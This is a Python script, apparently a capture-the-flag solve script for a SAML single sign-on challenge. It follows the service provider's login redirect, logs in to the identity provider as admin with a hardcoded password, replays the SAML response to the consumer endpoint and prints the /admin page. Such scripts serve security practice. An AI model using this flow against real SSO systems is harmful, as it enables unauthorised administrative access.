import re, urllib.parse, http.cookiejar, urllib.request

SP = "http://oj-10-30-15-1-44153.adworld.xctf.org.cn"
IDP = "http://oj-10-30-15-1-56469.adworld.xctf.org.cn"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect)
op2 = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fix(u):
    return (u.replace("http://127.0.0.1:80", IDP)
             .replace("http://idp", IDP)
             .replace("http://127.0.0.1:26000", SP)
             .replace("http://auth-flag.rctf.rois.team:26000", SP))

def get_nored(url):
    try:
        r = op.open(url, timeout=30)
        return r.status, r.headers, r.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read().decode('utf-8','replace')

def post(url, data, follow=True):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body)
    o = op2 if follow else op
    try:
        r = o.open(req, timeout=30)
        return r.status, r.headers, r.geturl(), r.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers, url, e.read().decode('utf-8','replace')

# 1. SP /saml/login -> Location to IdP
code, hdrs, _ = get_nored(SP + "/saml/login")
loc = fix(hdrs.get('Location'))
print("1) IdP SSO url:", loc[:120], "...")

q = urllib.parse.urlparse(loc)
params = urllib.parse.parse_qs(q.query)
saml_request = params.get('SAMLRequest', [''])[0]
relay_state = params.get('RelayState', ['/'])[0]
print("   SAMLRequest len", len(saml_request))

# 2. Login at IdP as admin
form = {"username":"admin","password":"RCTF2025","samlRequest":saml_request,"relayState":relay_state}
code, hdrs, goturl, body = post(IDP + "/login", form, follow=False)
print("2) login -> code", code, "location", hdrs.get('Location'))
loc2 = hdrs.get("Location") or ""
nexturl = fix(loc2) if loc2.startswith("http") else IDP + loc2

# 3. follow to /saml/sso
code, hdrs, body = get_nored(nexturl)
print("3) saml/sso ->", code, hdrs.get('Location'))
if hdrs.get('Location'):
    code, hdrs, body = get_nored(fix(hdrs.get('Location')))
    print("   ->", code, hdrs.get('Location'))

# body should be auto-submit form to ACS
print("   body head:", body[:400])

m = re.search(r'action="([^"]+)"', body)
if m:
    acs = fix(m.group(1))
    print("4) ACS:", acs)
    fields = dict(re.findall(r'name="([^"]+)"\s+value="([^"]*)"', body))
    print("   fields:", list(fields.keys()))
    code, hdrs, goturl, body2 = post(acs, fields, follow=False)
    print("   ACS resp:", code, "loc", hdrs.get('Location'), "goturl", goturl)
    print("   ACS body:", body2[:400])

# 5. admin
code, hdrs, body = get_nored(SP + "/admin")
print("5) /admin ->", code)
print(body[:2000])
